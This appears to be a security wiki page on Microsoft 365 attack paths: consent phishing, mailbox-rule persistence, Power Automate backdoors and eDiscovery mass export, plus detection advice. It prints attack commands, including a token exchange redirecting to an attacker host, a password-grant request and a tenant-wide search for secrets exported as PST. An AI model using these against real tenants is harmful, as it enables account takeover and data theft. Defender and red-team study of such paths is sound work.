---
title: M365 Admin Attack Paths — Consent Phishing to eDiscovery Theft
slug: m365-admin-attacks
---

> **TL;DR:** Microsoft 365 tenants fall to Entra app-consent phishing, Outlook mailbox-rule persistence, Power Automate flows as backdoors, and eDiscovery searches that exfiltrate the entire tenant in one click.

## What it is
M365 ties Entra ID, Exchange Online, SharePoint, and a sprawling automation surface (Power Platform, Graph) into one identity boundary. Real campaigns — Midnight Blizzard's 2024 Microsoft corporate breach, the 2023 Storm-0558 Outlook key theft, and the Octo Tempest (Scattered Spider) intrusions — exploit consent grants, OAuth refresh tokens, and admin-portal misuse rather than CVEs.

## Preconditions / where it applies
- Entra tenant allowing user consent to unverified multi-tenant apps
- Mailbox with Outlook rules + ROPC (Resource Owner Password Credentials) flow enabled
- Power Automate licence assigned to standard users
- Compromised account holding "eDiscovery Manager" or "Compliance Administrator" role

## Technique
App-consent phishing — register a multi-tenant Entra app, request `Mail.Read`, `Files.Read.All`, `offline_access`; victim consents and you receive a refresh token:

```bash
# Token exchange after victim consent
curl -X POST https://login.microsoftonline.com/$TID/oauth2/v2.0/token \
  -d "client_id=$CID&grant_type=authorization_code&code=$CODE&\
redirect_uri=https://attacker.tld/cb&client_secret=$SEC&scope=offline_access%20Mail.Read"
```

Outlook mailbox-rule persistence via ROPC (works only when CAP doesn't block legacy auth):

```bash
curl -X POST https://login.microsoftonline.com/$TID/oauth2/v2.0/token \
  -d "grant_type=password&username=victim@t.tld&password=$P&\
client_id=1950a258-227b-4e31-a9cf-717495945fc2&scope=https://graph.microsoft.com/.default"
# Then create a rule that forwards or deletes incoming security alerts
```

Power Automate as persistence — create a cloud flow under the victim's identity that triggers on new email and POSTs body+attachments to attacker infra. The flow survives password reset until the connection reference is deleted.

eDiscovery data theft — with Compliance Center access, run a content search across all mailboxes/SharePoint with a wide KQL query, then export the PST:

```text
# Microsoft Purview Compliance Center
New-ComplianceSearch -Name "q1" -ExchangeLocation All -SharePointLocation All \
  -ContentMatchQuery "password OR secret OR api_key"
Start-ComplianceSearchAction -SearchName "q1" -Export
```

BloodHound for M365 — run AzureHound to map Entra roles, app owners, and Graph-scope holders; pivot from a low-priv user through "Application Administrator" or "Cloud Application Administrator" to add credentials to a privileged app.

## Detection and defence
- Set "Users can consent to apps from verified publishers, for selected permissions" + admin-consent workflow
- Block legacy auth and ROPC via Conditional Access; require phishing-resistant MFA for all admin and eDiscovery roles
- Restrict Power Automate to vetted connectors; alert on flows with HTTP connectors to new domains
- Monitor Unified Audit Log for `Consent to application`, `New-InboxRule`, `SearchExported`, and `Add service principal credentials`
- Run AzureHound/ROADrecon yourself monthly to find the same shortest paths attackers would

## References
- [Entra app consent hardening](https://learn.microsoft.com/entra/identity/enterprise-apps/configure-user-consent) — official controls
- [Microsoft Storm-0558 post-mortem](https://msrc.microsoft.com/blog/2023/09/results-of-major-technical-investigations-for-storm-0558-key-acquisition/) — token-signing-key theft chain

See also: [[entra-id-enum]], [[entra-conditional-access-bypass]], [[app-registration-abuse]], [[managed-identities]].
